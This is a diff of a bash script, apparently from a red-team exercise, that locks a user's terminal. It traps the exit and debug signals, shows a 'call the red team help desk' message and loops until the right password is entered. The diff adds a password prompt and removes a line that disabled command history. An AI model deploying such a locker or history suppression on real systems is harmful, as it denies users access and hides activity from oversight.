@@ -14,7 +14,8 @@ trap disable_exit EXIT
 
 # Prompt for password
 echo "Your terminal has been disabled by red team, please call the red team help desk at [extension]. Please be aware we are very busy. Thank you!"
-read entered_password  # -s option hides the input
+echo "Please enter the password to unlock terminal: "
+read entered_password
 
 # Check if the entered password matches the defined password
 if [[ "$entered_password" != "$PASSWORD" ]]; then
@@ -22,9 +23,6 @@ if [[ "$entered_password" != "$PASSWORD" ]]; then
 
     # Trap and override all commands with a custom message
     trap 'echo "CALL US"' DEBUG
-    
-    # Disable command history (optional)
-    unset HISTFILE
     
     # Lock the terminal in a loop, preventing further use
     while true; do
